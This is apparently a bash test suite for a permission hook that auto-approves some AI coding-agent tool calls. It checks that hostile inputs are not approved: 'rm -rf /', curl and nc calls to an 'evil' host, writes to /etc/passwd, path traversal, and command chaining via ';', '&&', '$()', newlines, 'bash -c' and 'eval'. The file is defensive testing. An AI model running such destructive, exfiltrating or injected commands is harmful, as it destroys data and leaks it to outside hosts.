#!/bin/bash
# Test: permission-gate.sh
# PROTO-000 test for the PERMISSIONS charter mechanism.
#
# Verifies: (1) in-scope Sutra patterns auto-approve with correct JSON shape;
#           (2) out-of-scope patterns exit silently (fail-open, no output);
#           (3) shell-combinator injection attempts are rejected;
#           (4) kill-switches work.

set -u

PLUGIN_ROOT="$(cd "$(dirname "$0")/.." && pwd)"
HOOK="$PLUGIN_ROOT/hooks/permission-gate.sh"

PASS=0
FAIL=0
FAILURES=()

_result() {
  local name="$1" expected="$2" actual="$3"
  if [ "$expected" = "$actual" ]; then
    PASS=$((PASS+1))
    echo "  PASS: $name"
  else
    FAIL=$((FAIL+1))
    FAILURES+=("$name :: expected=$expected actual=$actual")
    echo "  FAIL: $name"
    echo "    expected: $expected"
    echo "    actual:   $actual"
  fi
}

_classify() {
  local out="$1"
  if [ -z "$out" ]; then echo EMPTY; return; fi
  if printf '%s' "$out" | grep -q '"behavior":"allow"'; then echo ALLOW; return; fi
  echo OTHER
}

_run() {
  local json="$1"
  printf '%s' "$json" | SUTRA_PERMISSIONS_DISABLED="" "$HOOK" 2>/dev/null
}

echo "== permission-gate.sh tests =="

# --- In-scope: should auto-approve ---

echo "[1] Bash(sutra) — bare dispatcher"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra"}}')
_result "bare sutra" ALLOW "$(_classify "$out")"

echo "[2] Bash(sutra start) — subcommand"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra start"}}')
_result "sutra start" ALLOW "$(_classify "$out")"

echo "[3] Bash(sutra status --verbose) — subcommand with args"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra status --verbose"}}')
_result "sutra status --verbose" ALLOW "$(_classify "$out")"

echo "[4] Bash(claude plugin marketplace update sutra)"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"claude plugin marketplace update sutra"}}')
_result "marketplace update sutra" ALLOW "$(_classify "$out")"

echo "[5] Bash(mkdir -p .claude/logs)"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"mkdir -p .claude/logs"}}')
_result "mkdir .claude/logs" ALLOW "$(_classify "$out")"

echo "[6] Write(.claude/depth-registered)"
out=$(_run '{"tool_name":"Write","tool_input":{"file_path":".claude/depth-registered"}}')
_result "write depth marker" ALLOW "$(_classify "$out")"

echo "[7] Write(.claude/logs/nested/a.log)"
out=$(_run '{"tool_name":"Write","tool_input":{"file_path":".claude/logs/nested/a.log"}}')
_result "write nested log" ALLOW "$(_classify "$out")"

# --- Out-of-scope: should exit silently (EMPTY stdout) ---

echo "[8] Bash(rm -rf /) — destructive"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}')
_result "rm -rf /" EMPTY "$(_classify "$out")"

echo "[9] Bash(curl https://evil.com) — network"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"curl https://evil.com"}}')
_result "curl random" EMPTY "$(_classify "$out")"

echo "[10] Write(/etc/passwd) — absolute outside project"
out=$(_run '{"tool_name":"Write","tool_input":{"file_path":"/etc/passwd"}}')
_result "write /etc/passwd" EMPTY "$(_classify "$out")"

echo "[11] Write(../escape/file) — traversal"
out=$(_run '{"tool_name":"Write","tool_input":{"file_path":"../escape/file"}}')
_result "write traversal" EMPTY "$(_classify "$out")"

echo "[12] Write(src/app.ts) — normal project file (ADR-003 first-time-edit auto-approve)"
out=$(_run '{"tool_name":"Write","tool_input":{"file_path":"src/app.ts"}}')
_result "write src/app.ts" ALLOW "$(_classify "$out")"

# --- Shell-combinator injection: should reject ---

echo "[13] Bash(sutra status; rm -rf /) — semicolon combinator"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra status; rm -rf /"}}')
_result "sutra + injection" EMPTY "$(_classify "$out")"

echo "[14] Bash(sutra && curl evil.com) — && combinator"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra && curl evil.com"}}')
_result "sutra + && chain" EMPTY "$(_classify "$out")"

echo "[15] Bash(sutra | nc evil 1234) — pipe combinator"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra | nc evil 1234"}}')
_result "sutra + pipe" EMPTY "$(_classify "$out")"

echo "[16] Bash(sutra \$(rm -rf /)) — command substitution"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra $(rm -rf /)"}}')
_result "sutra + subst" EMPTY "$(_classify "$out")"

# --- Kill-switch: should exit silently ---

echo "[17] Kill-switch via env var"
out=$(printf '%s' '{"tool_name":"Bash","tool_input":{"command":"sutra status"}}' | SUTRA_PERMISSIONS_DISABLED=1 "$HOOK" 2>/dev/null)
_result "env kill-switch" EMPTY "$(_classify "$out")"

# --- JSON shape verification ---

echo "[18] Decision JSON has updatedPermissions addRules entry"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra start"}}')
if printf '%s' "$out" | grep -q '"type":"addRules"' && \
   printf '%s' "$out" | grep -q '"destination":"localSettings"'; then
  _result "addRules shape" present present
else
  _result "addRules shape" present missing
fi

# --- Codex finding #5/#6: hardened combinator rejection ---

echo "[19] Bash(sutra & curl) — backgrounding operator"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra & curl evil.com"}}')
_result "sutra + & backgrounding" EMPTY "$(_classify "$out")"

echo "[20] Bash(bash -c 'sutra status; rm -rf /') — nested shell invocation"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"bash -c \"sutra status; rm -rf /\""}}')
_result "bash -c wrap" EMPTY "$(_classify "$out")"

echo "[21] Bash(sutra\\nrm -rf /) — embedded newline"
# JSON-encode an embedded newline
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra\nrm -rf /"}}')
_result "sutra + newline" EMPTY "$(_classify "$out")"

echo "[22] Bash(eval sutra start) — eval sneak-in"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"eval sutra start"}}')
_result "eval prefix" EMPTY "$(_classify "$out")"

# --- Codex finding #7: per-variant rule persistence ---

echo "[23] Bash(claude plugin update sutra) persists as Bash(claude plugin update sutra*)"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"claude plugin update sutra"}}')
if printf '%s' "$out" | grep -q '"ruleContent":"claude plugin update sutra\*"' ; then
  _result "sutra-variant rule content" correct correct
else
  _result "sutra-variant rule content" correct "mismatch: $(printf '%s' "$out" | grep -o '"ruleContent":"[^"]*"')"
fi

echo "[24] Bash(claude plugin update core) persists as Bash(claude plugin update core*)"
out=$(_run '{"tool_name":"Bash","tool_input":{"command":"claude plugin update core"}}')
if printf '%s' "$out" | grep -q '"ruleContent":"claude plugin update core\*"' ; then
  _result "core-variant rule content" correct correct
else
  _result "core-variant rule content" correct "mismatch: $(printf '%s' "$out" | grep -o '"ruleContent":"[^"]*"')"
fi

# --- ADR-003 §4 telemetry schema fields (tool_class, tool_family, decision_basis) ---

echo "[25] permission-gate.jsonl row has ADR-003 §4 fields (Bash tier-1)"
_TMP=$(mktemp -d)
printf '%s' '{"tool_name":"Bash","tool_input":{"command":"sutra start"}}' \
  | CLAUDE_PROJECT_DIR="$_TMP" "$HOOK" >/dev/null 2>&1
_LAST=$(tail -n 1 "$_TMP/.enforcement/permission-gate.jsonl" 2>/dev/null)
if printf '%s' "$_LAST" | jq -e '.tool_class == "bash" and .tool_family == null and .decision_basis == "tier-1"' >/dev/null 2>&1; then
  _result "ADR-003 fields (bash tier-1)" present present
else
  _result "ADR-003 fields (bash tier-1)" present "missing or wrong: $_LAST"
fi
rm -rf "$_TMP"

echo "[26] permission-gate.jsonl row has ADR-003 §4 fields (Bash trust-mode)"
_TMP=$(mktemp -d)
printf '%s' '{"tool_name":"Bash","tool_input":{"command":"git log --oneline -3"}}' \
  | CLAUDE_PROJECT_DIR="$_TMP" CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" >/dev/null 2>&1
_LAST=$(tail -n 1 "$_TMP/.enforcement/permission-gate.jsonl" 2>/dev/null)
if printf '%s' "$_LAST" | jq -e '.tool_class == "bash" and .tool_family == null and (.decision_basis | startswith("trust-mode"))' >/dev/null 2>&1; then
  _result "ADR-003 fields (bash trust-mode)" present present
else
  _result "ADR-003 fields (bash trust-mode)" present "missing or wrong: $_LAST"
fi
rm -rf "$_TMP"

echo "[27] permission-gate.jsonl row has ADR-003 §4 fields (Write tier-1)"
_TMP=$(mktemp -d)
printf '%s' '{"tool_name":"Write","tool_input":{"file_path":".claude/depth-registered"}}' \
  | CLAUDE_PROJECT_DIR="$_TMP" "$HOOK" >/dev/null 2>&1
_LAST=$(tail -n 1 "$_TMP/.enforcement/permission-gate.jsonl" 2>/dev/null)
if printf '%s' "$_LAST" | jq -e '.tool_class == "write" and .tool_family == null and .decision_basis == "tier-1"' >/dev/null 2>&1; then
  _result "ADR-003 fields (write tier-1)" present present
else
  _result "ADR-003 fields (write tier-1)" present "missing or wrong: $_LAST"
fi
rm -rf "$_TMP"

# --- Report ---

echo ""
echo "== Results: $PASS passed, $FAIL failed =="
if [ $FAIL -gt 0 ]; then
  echo "Failures:"
  for f in "${FAILURES[@]}"; do echo "  - $f"; done
  exit 1
fi
exit 0
